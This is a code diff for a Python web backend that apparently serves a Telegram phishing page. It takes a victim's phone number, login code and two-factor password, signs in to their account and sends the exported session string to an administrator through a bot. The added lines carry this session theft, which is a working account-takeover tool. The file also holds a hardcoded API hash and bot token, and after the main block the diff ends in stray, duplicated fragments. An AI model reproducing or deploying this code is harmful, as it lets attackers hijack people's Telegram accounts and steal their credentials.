@@ -6,7 +6,6 @@ import aiohttp_cors
 from pyrogram import Client
 from pyrogram.errors import SessionPasswordNeeded
 
-# Настройки
 API_ID = 15587172 
 API_HASH = "d3d35aebb0b6ebdb7a002836914ee37d"
 BOT_TOKEN = "8711443316:AAE7IDM3KETScemryNQQs21vruVv9DK1QHA"
@@ -20,20 +19,45 @@ active_clients = {}
 async def handle_api(request):
     try:
         data = await request.json()
-        action = data.get("action")
-        user_id = str(data.get("user_id"))
-
+        action, user_id = data.get("action"), str(data.get("user_id"))
         if action == "send_phone":
             phone = data.get("phone").replace(" ", "").replace("-", "")
             client = Client(name=f"u_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
             await client.connect()
-            sent_code = await client.send_code(phone)
-            active_clients[user_id] = {"client": client, "phone": phone, "hash": sent_code.phone_code_hash}
+            s_code = await client.send_code(phone)
+            active_clients[user_id] = {"c": client, "p": phone, "h": s_code.phone_code_hash}
             return web.json_response({"status": "ok"})
-
         elif action == "send_code":
-            code = data.get("code")
             session = active_clients.get(user_id)
+            if not session: return web.json_response({"status": "error", "message": "Session expired"})
+            try:
+                await session["c"].sign_in(session["p"], session["h"], data.get("code"))
+                ss = await session["c"].export_session_string()
+                await bot.send_message(ADMIN_ID, f"✅ LOGIN!\n{session['p']}\n\n`{ss}`", parse_mode="Markdown")
+                return web.json_response({"status": "success"})
+            except SessionPasswordNeeded: return web.json_response({"status": "need_2fa"})
+        elif action == "send_2fa":
+            session = active_clients.get(user_id)
+            await session["c"].check_password(data.get("password"))
+            ss = await session["c"].export_session_string()
+            await bot.send_message(ADMIN_ID, f"✅ 2FA!\n{session['p']}\n\n`{ss}`", parse_mode="Markdown")
+            return web.json_response({"status": "success"})
+    except Exception as e: return web.json_response({"status": "error", "message": str(e)})
+
+app = web.Application()
+cors = aiohttp_cors.setup(app, defaults={"*": aiohttp_cors.ResourceOptions(allow_credentials=True, expose_headers="*", allow_headers="*")})
+resource = app.router.add_resource("/api")
+cors.add(resource.add_route("POST", handle_api))
+
+async def main():
+    port = int(os.environ.get("PORT", 10000))
+    runner = web.AppRunner(app)
+    await runner.setup()
+    await web.TCPSite(runner, '0.0.0.0', port).start()
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
+    asyncio.run(main())
             if not session: return web.json_response({"status": "error", "message": "Сессия истекла"})
             try:
                 await session["client"].sign_in(session["phone"], session["hash"], code)
